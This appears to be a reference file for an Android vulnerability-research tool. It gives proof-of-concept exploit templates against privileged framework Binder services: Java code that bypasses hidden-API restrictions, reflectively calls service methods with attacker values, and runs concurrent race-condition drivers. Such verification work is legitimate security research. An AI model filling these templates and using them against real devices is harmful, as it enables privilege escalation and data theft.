---
name: poc-framework-service
description: Framework-service PoC reference covering clearCallingIdentity misuse, missing permission enforcement, identity confusion, intent redirect, data exposure, and race conditions.
---

# Framework Service PoC Reference

Binder calls into `system_server` or another privileged framework process. Almost always `binder-caller` shape. Findings come from `decx-framework-vulnhunt` (`--kind framework`).

Framework fact prefixes used in re-verification: `service-entrypoint`, `binder-reachability`, `identity`, `permission-guard`, `appop-guard`, `user-guard`, `identity-transition`, `control`, `sink`, `impact`.

## Hidden API Rule

Framework-service PoCs usually need hidden API access for `ServiceManager` and related Binder plumbing.

```java
import org.lsposed.hiddenapibypass.HiddenApiBypass;
HiddenApiBypass.addHiddenApiExemptions("");
```

Do not mix hidden-API setup into ordinary app-component PoCs.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---|---|---|---|
| `clearCallingIdentity()` misuse | `binder-caller` | hidden API | privileged work runs after attacker-triggered call |
| missing permission enforcement | `binder-caller` | hidden API | privileged Binder method succeeds without required permission |
| identity confusion | `binder-caller` | hidden API | attacker acts for another user or caller identity |
| intent redirect | `binder-caller` | hidden API | privileged service forwards attacker-controlled Intent |
| data exposure | `binder-caller` | hidden API | privileged data is returned |
| race condition | `binder-caller` | hidden API + concurrency | repeated concurrent calls trigger inconsistent state |

## Pattern 1 - Parameterized Binder Caller

For permission-missing, identity-confusion, intent-redirect, and data-leak cases.

```java
private static void runApiTest(
    String serviceName, String interfaceDescriptor,
    String methodName, Class<?>[] paramTypes, Object[] params
) {
    try {
        HiddenApiBypass.addHiddenApiExemptions("");
        Class<?> smClass = Class.forName("android.os.ServiceManager");
        Method getService = HiddenApiBypass.getDeclaredMethod(smClass, "getService", String.class);
        IBinder serviceBinder = (IBinder) getService.invoke(null, serviceName);

        Method asInterface = HiddenApiBypass.getDeclaredMethod(
            Class.forName(interfaceDescriptor + "$Stub"), "asInterface", IBinder.class);
        Object service = asInterface.invoke(null, serviceBinder);

        Method targetMethod = HiddenApiBypass.getDeclaredMethod(
            Class.forName(interfaceDescriptor + "$Stub$Proxy"), methodName, paramTypes);
        Object result = targetMethod.invoke(service, params);

        Log.i("PoC", "Binder call result: " + String.valueOf(result));
    } catch (Exception e) {
        Log.e("PoC", "Framework Binder setup failed", e);
    }
}
```

```java
static {
    register("framework-api-test", "Call Framework API", () -> {
        runApiTest(
            "vulnerable_service", "android.os.IVulnerableService", "sensitiveMethod",
            new Class<?>[]{String.class, int.class},
            new Object[]{"attacker-value", 0}
        );
    });
}
```

Fill with: real service name, real interface descriptor, one verified vulnerable method only, exact parameter types and argument values.

## Pattern 2 - Concurrency Driver

For race-condition findings.

```java
private static void runFrameworkRace(
    String serviceName, String interfaceDescriptor,
    String methodName, Class<?>[] paramTypes, Object[] params
) {
    int n = 10;
    ExecutorService executor = Executors.newFixedThreadPool(n);
    CountDownLatch latch = new CountDownLatch(n);

    for (int i = 0; i < n; i++) {
        executor.submit(() -> {
            try { runApiTest(serviceName, interfaceDescriptor, methodName, paramTypes, params); }
            finally { latch.countDown(); }
        });
    }
}
```

Use only when the verified finding depends on a timing window. Do not use for ordinary single-call authorization bugs.

Keep the exploit focused on one service name, one interface descriptor, and one method. If the service uses unreconstructed parcelables/callbacks/hidden classes, do not overclaim `build-ready`.
